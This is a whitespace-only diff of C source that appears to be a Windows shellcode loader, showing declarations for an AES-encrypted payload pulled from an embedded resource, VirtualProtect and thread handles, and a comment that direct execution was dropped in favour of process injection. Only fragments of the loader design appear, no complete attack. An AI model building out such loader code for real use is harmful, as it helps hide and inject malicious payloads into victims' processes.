@@ -71,20 +71,20 @@ int main(void) {
 	// =====================
 	// Variable declarations
 	// =====================
-	void * payload_memory_buffer; 	    // pointer to the memory buffer that stores the extracted payload
+	void * payload_memory_buffer; 	   	// pointer to the memory buffer that stores the extracted payload
 	BOOL virtualprotect_return_value; 	// flag to see if VirtualProtect returned successfully
-	HANDLE thread_handle; 				// handle for the newly created thread
-	DWORD old_protection = 0; 			// used to store the previous memory protection of the allocated buffer
+	HANDLE thread_handle; 			// handle for the newly created thread
+	DWORD old_protection = 0; 		// used to store the previous memory protection of the allocated buffer
 	HGLOBAL resource_handle = NULL; 	// handle to store return value from LoadResource() Win API
-	HRSRC resource; 					// handle to store return value from FindResource() Win API
+	HRSRC resource; 			// handle to store return value from FindResource() Win API
 		
 	unsigned char * payload_data; 		// pointer to the actual data of the payload
-	unsigned int payload_size; 			// size of the payload data in bytes
+	unsigned int payload_size; 		// size of the payload data in bytes
 
 	char aes_key[] = { 0x7b, 0x89, 0xca, 0xda, 0x91, 0xf3, 0x64, 0xb6, 0x9d, 0x43, 0x77, 0xbd, 0xca, 0x9f, 0xfd, 0xfe };
 
 	int pid = 0;
-    HANDLE hProc = NULL;
+    	HANDLE hProc = NULL;
 
 
 
@@ -127,8 +127,8 @@ int main(void) {
 	// BELOW WAS COMMENTED OUT IN FAVOR OF PROCESS INJECTION
 	// ======================================================================
 	// EXECUTE THE PAYLOAD
-    // If the buffer protection was changed successfully, create a new thread 
-    // that starts executing the code located at the beginning of the 
+   	// If the buffer protection was changed successfully, create a new thread 
+    	// that starts executing the code located at the beginning of the 
 	// allocated buffer then wait indefinitely for the thread to terminate
 	// ======================================================================
 	//if ( virtualprotect_return_value != 0 ) 
